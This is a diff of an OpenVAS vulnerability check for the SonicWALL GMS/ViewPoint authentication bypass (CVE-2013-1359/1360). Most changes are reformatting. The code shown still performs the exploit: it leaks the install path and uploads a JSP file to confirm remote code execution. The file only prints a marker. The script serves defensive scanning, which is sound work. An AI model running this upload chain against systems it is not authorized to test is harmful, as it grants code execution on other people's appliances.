@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_SonicWALL_rce_01_13.nasl 13659 2019-02-14 08:34:21Z cfischer $
+# $Id: gb_SonicWALL_rce_01_13.nasl 13994 2019-03-05 12:23:37Z cfischer $
 #
 # Multiple SonicWALL Products Authentication Bypass Vulnerability
 #
@@ -32,7 +32,7 @@ if(description)
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
   script_bugtraq_id(57445);
   script_cve_id("CVE-2013-1359", "CVE-2013-1360");
-  script_version("$Revision: 13659 $");
+  script_version("$Revision: 13994 $");
 
   script_name("Multiple SonicWALL Products Authentication Bypass Vulnerability");
 
@@ -40,7 +40,7 @@ if(description)
   script_xref(name:"URL", value:"http://www.sonicwall.com/");
   script_xref(name:"URL", value:"http://sotiriu.de/adv/NSOADV-2013-001.txt");
 
-  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
   script_tag(name:"creation_date", value:"2013-01-18 13:01:11 +0100 (Fri, 18 Jan 2013)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -49,21 +49,29 @@ if(description)
   script_dependencies("find_service.nasl", "http_version.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
+
   script_tag(name:"solution", value:"Vendor updates are available. Please see the references for more
-information.");
+  information.");
+
   script_tag(name:"solution_type", value:"VendorFix");
+
   script_tag(name:"summary", value:"Multiple SonicWALL products including Global Management System (GMS),
-ViewPoint, Universal Management Appliance (UMA), and Analyzer are
-prone to an authentication-bypass vulnerability.
+  ViewPoint, Universal Management Appliance (UMA), and Analyzer are
+  prone to an authentication-bypass vulnerability.");
 
-Attackers can exploit this issue to gain administrative access to the
-web interface. This allows attackers to execute arbitrary code with
-SYSTEM privileges that could fully compromise the system.
+  script_tag(name:"impact", value:"Attackers can exploit this issue to gain administrative access to the
+  web interface. This allows attackers to execute arbitrary code with SYSTEM privileges that could fully
+  compromise the system.");
 
-The following versions are affected:
+  script_tag(name:"affected", value:"GMS/Analyzer/UMA 7.0.x
 
-GMS/Analyzer/UMA 7.0.x GMS/ViewPoint/UMA 6.0.x GMS/ViewPoint/UMA 5.1.x
-GMS/ViewPoint 5.0.x GMS/ViewPoint 4.1.x");
+  GMS/ViewPoint/UMA 6.0.x
+
+  GMS/ViewPoint/UMA 5.1.x
+
+  GMS/ViewPoint 5.0.x
+
+  GMS/ViewPoint 4.1.x");
 
   exit(0);
 }
@@ -77,10 +85,10 @@ port = get_http_port(default:80);
 url = "/";
 buf = http_get_cache(item:url, port:port);
 
-if("<title>sonicwall" >!< tolower(buf))exit(0);
+if(! buf || "<title>sonicwall" >!< tolower(buf))
+  exit(0);
 
 useragent = http_get_user_agent();
-vtstring = get_vt_string( lowercase:TRUE );
 host = http_host_name(port:port);
 
 req = string(
@@ -95,8 +103,8 @@ req = string(
 "num=123456&action=show_diagnostics&task=search&item=application_log&criteria=*.*&width=500\r\n");
 
 result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-
-if("<OPTION VALUE" >!< result)exit(0);
+if("<OPTION VALUE" >!< result)
+  exit(0);
 
 lines = split(result);
 
@@ -111,18 +119,18 @@ foreach line (lines) {
   }
 }
 
-if(isnull(gms_path))exit(0);
+if(isnull(gms_path))
+  exit(0);
 
 if(gms_path =~ "^/") {
   gms_path = gms_path + "webapps/appliance/";
-}
-else {
+} else {
   gms_path = gms_path + 'webapps\\appliance\\';
 }
 
-file = vtstring + '_' + rand() +  '.jsp';
-
-jsp_print = vtstring + '_' + rand();;
+vtstrings = get_vt_strings();
+file = vtstrings["lowercase_rand"] + '.jsp';
+jsp_print = vtstrings["lowercase_rand"];
 jsp = '<% out.println( "' + jsp_print  + '" ); %>';
 
 len = 325 + strlen(jsp) + strlen(gms_path) + strlen(file);
@@ -158,8 +166,8 @@ jsp,"\r\n",
 "--xYzZY--\r\n");
 
 result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-
-if(result !~ "HTTP/1.. 200")exit(0);
+if(!result || result !~ "^HTTP/1\.[01] 200")
+  exit(0);
 
 url = '/appliance/' + file;
 req = http_get(item:url, port:port);
